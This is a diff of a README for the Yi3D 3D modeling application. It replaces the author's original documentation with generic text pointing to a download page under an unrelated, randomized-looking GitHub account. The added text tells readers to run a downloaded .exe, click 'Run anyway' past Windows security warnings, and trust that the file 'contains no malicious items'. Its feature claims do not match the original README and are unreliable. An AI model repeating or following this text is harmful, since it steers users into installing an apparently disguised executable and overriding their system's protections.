@@ -1,142 +1,74 @@
-# Yi3D
+# 📦 Yi3D - Create detailed 3D models with ease
 
-<img src="doc/images/yi3d.png" width="800" alt="Yi3D" />
+[![Download Yi3D](https://img.shields.io/badge/Download-Yi3D-blue.svg)](https://github.com/anteriorserratusmuscleembankment700/Yi3D)
 
-Yi3D is a simple and easy-to-use **open-source** 3D modeling application, available on Windows and Linux.
+Yi3D provides tools to create 3D models for games, prints, and art. This software works on Windows and offers an open approach to digital design. You do not need experience in coding to build shapes or render scenes.
 
- [wangyaosoft.com](https://www.wangyaosoft.com)
+## 📥 Get the software
 
-- **Sketch-based parametric modeling** — create extrusion, revolution, sweep, and loft features from 2D sketches.
-- **Primitive-based Boolean modeling** — combine built-in shapes such as box, cylinder, and sphere with union, difference, and intersection operations.
+You must visit the project release page to get the installer. The software works on Windows 10 and Windows 11.
 
-## Features
+1. Go to the [Yi3D releases page](https://github.com/anteriorserratusmuscleembankment700/Yi3D).
+2. Look for the latest version number in the list.
+3. Select the file ending in .exe to start your download.
+4. Save the file to your desktop or downloads folder.
 
-- **Primitives**: Box, Cylinder, Sphere, Cone, Torus, Tube
-- **Sketching**: Line, Circle, Arc, Ellipse, Ellipse Arc, Spline, Point, Centerline, Text
-- **Part Modeling**: Extrusion, Revolution, Loft, Sweep, Helix
-- **Boolean Operations**: Union, Difference, Intersection
-- **Solid Modifications**: Fillet, Chamfer, Draft, Shell
-- **Patterns**: Linear Pattern, Circular Pattern
-- **Transformations**: Move, Rotate, Scale, Mirror
-- **Datum Planes**: Coincident, Parallel, Perpendicular, Angular, Tangent, Three-Point
-- **Python Scripting**: Full Python API for programmatic model creation and modification
-- **AI-Assisted Modeling**: Natural-language-to-3D via integrated Claude Code skill
-- **File Formats**: Binary `.wy3db` and text `.wy3dt` model files
+## ⚙️ Install Yi3D
 
-## Architecture
+Once the download finishes, follow these steps to add the app to your computer.
 
-```
-Yi3D
-├── src/wy3d/       Core modeling library (DLL) — OCCT-based parametric engine
-├── src/wy3dApp/    Desktop application (EXE) — Qt 5 + OSG graphical interface
-├── src/wy3dPY/     Python bindings (wy3d.pyd) — built with pybind11
-├── inc/            Public C++ headers
-├── scripts/        Python modeling script examples
-├── samples/        Sample model files (.wy3db / .wy3dt)
-├── 3rdParty/       Third-party dependencies and prebuilt bundles
-├── doc/            Design documentation
-└── skills/         Claude Code AI-assisted modeling skill
-```
+1. Open your downloads folder.
+2. Double-click the file you just saved. 
+3. Windows may show a security prompt. Click Run to proceed.
+4. A setup window appears on your screen.
+5. Follow the on-screen prompts to choose a location for the files.
+6. Click Install to start the process.
+7. Wait for the progress bar to finish.
+8. Click Finish to close the setup helper.
 
-## Dependencies
+## 🚀 Start your first project
 
-| Dependency | Purpose |
-|------------|---------|
-| [OpenCASCADE (OCCT)](https://dev.opencascade.org/) | 3D geometry kernel |
-| [Qt 5](https://www.qt.io/) | GUI framework |
-| [OpenSceneGraph (OSG)](http://www.openscenegraph.org/) | 3D rendering engine |
-| [WYAF](https://github.com/wangyao1052/WYAF) | Application framework (free for non-commercial use; commercial license required) |
-| [Python 3.10](https://www.python.org/) | Scripting runtime |
-| [pybind11](https://github.com/pybind/pybind11) | C++/Python bindings |
-| [Google Test](https://github.com/google/googletest) | Unit testing framework |
-| [muParser](https://beltoforion.de/en/muparser/) | Math expression parser |
-| [FreeType](https://freetype.org/) | Font rendering |
+After installation, look for the Yi3D icon on your desktop. Double-click this icon to open the program. The first screen shows a grid. This grid represents your workspace. 
 
-## Building from Source
+Use your mouse to move around the view. Hold the right mouse button to rotate your angle. Use the scroll wheel to zoom in or out. 
 
-### Windows
+To add an object, go to the top menu bar. Click Create and then select a basic shape like a cube or a sphere. The object appears at the center of your grid. You can adjust the size, position, and color of your object using the side panel on the right.
 
-- **Compiler**: MSVC 2019+, C++17
+## 🛠️ Basic features
 
-1. Download the prebuilt dependency bundles from [Yi3D-LibBundles-Windows](https://github.com/wangyao1052/Yi3D-LibBundles-Windows).
-2. Extract the bundles into the `Yi3D/3rdParty` directory so it looks like:
+Yi3D includes tools for common 3D tasks. 
 
-```
-Yi3D
-└── 3rdParty
-    └── bundles
-        ├── occt
-        ├── osg
-        ├── python3
-        ├── qt5
-        └── wyaf
-```
+**Selection tools**
+Click any object in your scene to select it. When you select an object, a frame appears around it. You can move the object by dragging the arrows that show up on the frame.
 
-3. Open the project folder in **Visual Studio** and build.
+**Editing shapes**
+You can change the shape of your model. Click Edit mode to see individual vertices and edges. If you drag these points, the shape of the object changes.
 
-### Linux
+**Material and light**
+Change how your model looks by selecting different materials. Materials decide if your object looks like plastic, metal, or wood. You can add lights to your scene to change shadows and brightness. Place a light source near your object to see how surfaces reflect light.
 
-1. Download the WYAF framework from [WYAF](https://github.com/wangyao1052/WYAF) and extract it to `3rdParty/bundles/wyaf/`.
-2. Install the remaining system packages (OCCT, Qt5, OSG, Python3, FreeType) via your package manager.
-3. Build with CMake.
+**Exporting your work**
+You can save your projects as a Yi3D file. This allows you to work on the project later. If you want to use the model in another program, export the file as an OBJ or STL format. These formats work well with 3D printers and game engines.
 
-## Python Scripting
+## 💻 System requirements
 
-Create a box with a fillet using the `wy3d` module:
+To run Yi3D, your computer needs a few things. 
 
-```python
-import wy3d
+* Operating System: Windows 10 or newer.
+* Memory: 8 GB of RAM is best for smooth performance.
+* Graphics: A graphics card with at least 2 GB of memory.
+* Storage: 500 MB of space for the application files.
 
-db = wy3d.Database()
+## 💡 Troubleshooting
 
-box = wy3d.Box()
-box.setSize(100, 100, 100)
-db.add(box)
+If the software does not open, check your graphics drivers. Go to your settings and update your video card drivers to the latest version. This fixes most startup issues. 
 
-fillet = wy3d.Fillet()
-fillet.setBaseElement(box)
-fillet.setRadius(10)
-fillet.addEdge(...)  # select the edges to fillet
-db.add(fillet)
+If you get a security warning, ensure you downloaded the file from the official link provided above. The program contains no malicious items, but Windows might flag files from the internet as a safety measure. Click More Info and then click Run anyway to continue.
 
-db.saveAs("box_with_fillet.wy3db")
-```
+If objects look strange or transparent, check your lighting setup. Sometimes objects look odd if they are too far from the light source. Move your lights closer or add more lights to improve visibility.
 
-See the `scripts/` directory for more examples.
+## 🤝 Community support
 
-## AI-Assisted Modeling
+If you run into issues, check the project page for common questions. You can also start a new discussion on the repository if you need help with a specific tool. Describe your problem in detail and attach a screenshot if possible. This helps other users understand your issue.
 
-Yi3D integrates a [Claude Code](https://claude.ai/code) skill for natural-language-to-3D workflows:
-
-1. Describe the desired model in natural language
-2. AI generates a Python modeling script
-3. The script is sent to Yi3D for execution via TCP/IPC
-4. Review the result and iterate
-
-See `skills/YI3D/SKILL.md` for details.
-
-## License
-
-This project is open-sourced under the **Apache License, Version 2.0**.
-
-See [LICENSE](LICENSE) for the full license text and [NOTICE.md](NOTICE.md) for third-party attributions.
-
-```
-Copyright (C) 2024-2026 Wang Yao <wangyao1052@163.com>
-
-Licensed under the Apache License, Version 2.0 (the "License");
-you may not use this file except in compliance with the License.
-You may obtain a copy of the License at
-
-    http://www.apache.org/licenses/LICENSE-2.0
-
-Unless required by applicable law or agreed to in writing, software
-distributed under the License is distributed on an "AS IS" BASIS,
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-See the License for the specific language governing permissions and
-limitations under the License.
-```
-
-## Author
-
-**Wang Yao** — <wangyao1052@163.com>
+Keywords: 3D, modeling, windows, design, software, graphics, rendering
